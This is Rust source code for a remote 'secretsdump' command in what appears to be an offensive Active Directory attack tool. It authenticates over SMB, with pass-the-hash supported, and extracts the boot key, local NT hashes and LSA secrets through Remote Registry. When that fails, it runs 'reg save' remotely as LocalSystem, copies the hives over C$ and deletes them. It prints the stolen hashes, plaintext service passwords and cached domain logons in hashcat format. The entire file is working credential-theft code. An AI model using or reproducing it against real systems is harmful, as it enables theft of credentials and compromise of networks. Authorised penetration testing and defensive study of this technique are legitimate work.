//! **1.4.8-C WS-SAM-SECURITY-DUMP.** Local secretsdump: pull SAM + SECURITY +
//! (implicit) SYSTEM over MS-RRP where possible, fall back to `reg save` hive
//! pulls when Remote Registry is off. Decrypts local NT hashes and LSA secrets
//! (including DCC2 cached logons) offline via the SYSKEY chain
//! (`adhammer_secrets::local_dump` / `local_lsa`). Fast path: bootkey via
//! `dcerpc::rrp` class-name walk → SAM + LSA decrypted without 15 MB hive
//! downloads. Slow path: `reg save HKLM\{SAM,SECURITY,SYSTEM}` as LocalSystem
//! + C\$ pull. Both end at the same offline decrypt.

use anyhow::{Context, Result};
use clap::Parser;

#[derive(Parser)]
pub(crate) struct SecretsdumpArgs {
    #[command(flatten)]
    pub auth: crate::shared_args::SmbAuth,
    /// Pass-the-hash: NT hash (32 hex, or LM:NT) instead of --password
    #[arg(long)]
    pub nt_hash: Option<adhammer_core::SecretString>,
}

/// Local secretsdump: run `reg save` for SYSTEM + SAM as LocalSystem, pull the hives over C$,
/// then decrypt the local account NT hashes offline (bootkey → SAM key → per-user).
pub(crate) async fn secretsdump(mut a: SecretsdumpArgs) -> Result<()> {
    a.auth.password = crate::resolve_secret(&a.auth.password, "ADHAMMER_PASSWORD")?;
    use smb2_client::SmbClient;
    let mut smb = SmbClient::connect(&a.auth.host).await?;
    crate::smb_login(
        &mut smb,
        &a.auth.host,
        &a.auth.domain,
        &a.auth.user,
        &a.auth.password,
        &a.nt_hash,
    )
    .await?;
    smb.tree_connect(&format!("\\\\{}\\IPC$", a.auth.host))
        .await?;

    // Fast path: pull the bootkey directly via MS-RRP (WINREG API). Four tiny RPC
    // roundtrips for the Lsa\{JD,Skew1,GBG,Data} key CLASS NAMES — no `reg save HKLM\SYSTEM`,
    // no 15 MB hive download, no polling. Only falls back to the hive-save path if the
    // Remote Registry service is unreachable.
    // Fast path: full RRP secretsdump (bootkey + SAM users + LSA secrets) — no `reg save`
    // anywhere. Falls back to the hive-save path if Remote Registry is off or any RRP step fails.
    let mut rrp_sam: Option<Vec<adhammer_secrets::SamAccount>> = None;
    let mut rrp_lsa: Option<Vec<adhammer_secrets::LsaSecret>> = None;
    let bootkey_rrp = {
        let mut reg = match dcerpc::rrp::RegistryClient::connect(
            &mut smb,
            &a.auth.domain,
            &a.auth.user,
            &a.auth.password,
            &a.auth.host,
        )
        .await
        {
            Ok(r) => Some(r),
            Err(e) => {
                eprintln!(
                    "[!] Remote Registry unreachable ({e}) — falling back to `reg save` hives"
                );
                None
            }
        };
        match reg.as_mut() {
            Some(r) => {
                // Open HKLM once and reuse it across all three RRP calls — saves 4 RPC
                // roundtrips (2 opens + 2 closes) versus opening HKLM inside each helper.
                match r.hklm().await {
                    Ok(hklm) => {
                        let bk_res = adhammer_secrets::bootkey_via_rrp_hklm(r, &hklm).await;
                        let bk_opt = match bk_res {
                            Ok(bk) => {
                                eprintln!(
                                    "[+] bootkey via RRP: {}",
                                    bk.iter().map(|b| format!("{b:02x}")).collect::<String>()
                                );
                                if let Ok(users) =
                                    adhammer_secrets::dump_sam_via_rrp_hklm(r, &hklm, &bk).await
                                {
                                    eprintln!("[+] SAM via RRP: {} account(s)", users.len());
                                    rrp_sam = Some(users);
                                }
                                if let Ok(secrets) =
                                    adhammer_secrets::dump_lsa_via_rrp_hklm(r, &hklm, &bk).await
                                {
                                    eprintln!("[+] LSA via RRP: {} secret(s)", secrets.len());
                                    rrp_lsa = Some(secrets);
                                }
                                Some(bk)
                            }
                            Err(e) => {
                                eprintln!(
                                    "[!] RRP bootkey failed ({e}) — falling back to `reg save` hives"
                                );
                                None
                            }
                        };
                        r.close_handle(&hklm).await;
                        bk_opt
                    }
                    Err(e) => {
                        eprintln!(
                            "[!] RRP OpenHKLM failed ({e}) — falling back to `reg save` hives"
                        );
                        None
                    }
                }
            }
            None => None,
        }
    };

    // Skip `reg save` for anything RRP already delivered. If RRP handled EVERYTHING (bootkey
    // + SAM + LSA) we never touch SVCCTL/`reg save` — the hive-based fallback is only for
    // hives whose data we still need.
    let sys_rel = "Windows\\Temp\\ADh_sys.tmp";
    let sam_rel = "Windows\\Temp\\ADh_sam.tmp";
    let sec_rel = "Windows\\Temp\\ADh_sec.tmp";
    let want_system = bootkey_rrp.is_none();
    let want_sam = rrp_sam.is_none();
    let want_security = rrp_lsa.is_none();
    let mut hives: Vec<(&str, &str)> = Vec::new();
    if want_system {
        hives.push(("SYSTEM", sys_rel));
    }
    if want_sam {
        hives.push(("SAM", sam_rel));
    }
    if want_security {
        hives.push(("SECURITY", sec_rel));
    }
    for (hive, rel) in &hives {
        smb.tree_connect(&format!("\\\\{}\\IPC$", a.auth.host))
            .await?;
        let cmd = format!("reg save HKLM\\{hive} C:\\{rel} /y");
        let ret = dcerpc::svcctl::run(&mut smb, &cmd).await?;
        tracing::info!("reg save {hive}: SCM start win32 {ret}");
    }

    let (system, sam, security) = if hives.is_empty() {
        (None, None, None)
    } else {
        smb.tree_connect(&format!("\\\\{}\\C$", a.auth.host))
            .await?;
        let sys = if want_system {
            Some(
                smb.read_file_delete(sys_rel)
                    .await
                    .context("read SYSTEM hive over C$")?,
            )
        } else {
            None
        };
        let sa = if want_sam {
            smb.read_file_delete(sam_rel).await.ok()
        } else {
            None
        };
        let se = if want_security {
            smb.read_file_delete(sec_rel).await.ok()
        } else {
            None
        };
        (sys, sa, se)
    };
    eprintln!(
        "[+] hives: SYSTEM {}, SAM {}, SECURITY {}",
        system
            .as_ref()
            .map_or("skipped (RRP)".into(), |v| format!("{} B", v.len())),
        sam.as_ref()
            .map_or("unavailable".into(), |v| format!("{} B", v.len())),
        security
            .as_ref()
            .map_or("unavailable".into(), |v| format!("{} B", v.len())),
    );
    if sam.is_none() || security.is_none() {
        eprintln!(
            "[!] a protected hive was denied by the target (SeBackupPrivilege / hardening). \
             On a DC, use `attack dcsync` for domain secrets — SAM/LSA here cover only local creds."
        );
    }

    // --- SAM: local account NT hashes ---
    let sam_accounts: Option<Vec<adhammer_secrets::SamAccount>> = if let Some(u) = rrp_sam {
        Some(u)
    } else {
        match (sam.as_ref(), bootkey_rrp.as_ref(), system.as_ref()) {
            (Some(s), Some(bk), _) => adhammer_secrets::local_dump_with_bootkey(s, bk)
                .map_err(|e| eprintln!("[-] SAM decrypt failed: {e}"))
                .ok(),
            (Some(s), None, Some(sys)) => adhammer_secrets::local_dump(sys, s)
                .map_err(|e| eprintln!("[-] SAM decrypt failed: {e}"))
                .ok(),
            _ => None,
        }
    };
    match sam_accounts {
        Some(accounts) => {
            eprintln!("[+] {} local account(s):", accounts.len());
            for acct in accounts {
                println!("{}", acct.secretsdump_line());
            }
        }
        None => eprintln!("[*] SAM hive unavailable — skipping local accounts"),
    }

    // --- LSA secrets + cached domain credentials (DCC2) ---
    // RRP path returns secrets only (DCC2 needs BaseRegEnumValue — follow-up); hive path
    // returns both.
    if let Some(secrets) = rrp_lsa {
        eprintln!("[+] {} LSA secret(s):", secrets.len());
        for s in &secrets {
            if s.name.eq_ignore_ascii_case("$MACHINE.ACC") {
                let nt: String = ntlmssp::md4(&s.secret)
                    .iter()
                    .map(|b| format!("{b:02x}"))
                    .collect();
                println!("$MACHINE.ACC:aad3b435b51404eeaad3b435b51404ee:{nt}:::");
            } else {
                print_lsa_secret(&s.name, &s.secret);
            }
        }
        eprintln!(
            "[*] DCC2 cache via RRP not yet implemented — falling back requires the SECURITY hive."
        );
        return Ok(());
    }
    let Some(security) = security.as_ref() else {
        eprintln!("[*] SECURITY hive unavailable — skipping LSA secrets / DCC2");
        return Ok(());
    };
    let lsa_result = match (bootkey_rrp.as_ref(), system.as_ref()) {
        (Some(bk), _) => adhammer_secrets::local_lsa_with_bootkey(security, bk),
        (None, Some(sys)) => adhammer_secrets::local_lsa(sys, security),
        _ => Err("no bootkey and no SYSTEM hive — cannot derive LSA key".into()),
    };
    match lsa_result {
        Ok(dump) => {
            eprintln!("[+] {} LSA secret(s):", dump.secrets.len());
            for s in &dump.secrets {
                if s.name.eq_ignore_ascii_case("$MACHINE.ACC") {
                    let nt: String = ntlmssp::md4(&s.secret)
                        .iter()
                        .map(|b| format!("{b:02x}"))
                        .collect();
                    println!("$MACHINE.ACC:aad3b435b51404eeaad3b435b51404ee:{nt}:::");
                } else {
                    print_lsa_secret(&s.name, &s.secret);
                }
            }
            if !dump.cached.is_empty() {
                eprintln!(
                    "[+] {} cached domain logon(s) (hashcat -m 2100):",
                    dump.cached.len()
                );
                for c in &dump.cached {
                    println!("{}", c.dcc2_line());
                }
            }
        }
        Err(e) => eprintln!("[-] LSA decrypt failed: {e}"),
    }
    Ok(())
}

/// Print an LSA secret readably: a printable UTF-16 string, else hex.
fn print_lsa_secret(name: &str, secret: &[u8]) {
    // Render as text only if it's a clean printable-ASCII UTF-16 string (e.g. DefaultPassword);
    // binary key material (NL$KM, DPAPI_SYSTEM) prints as hex.
    let units: Vec<u16> = secret
        .chunks_exact(2)
        .map(|c| u16::from_le_bytes([c[0], c[1]]))
        .take_while(|&u| u != 0)
        .collect();
    let printable = !units.is_empty() && units.iter().all(|&u| (0x20..0x7f).contains(&u));
    if printable {
        println!("{name}:{}", String::from_utf16_lossy(&units));
    } else {
        println!("{name}:{}", hex::encode(secret));
    }
}
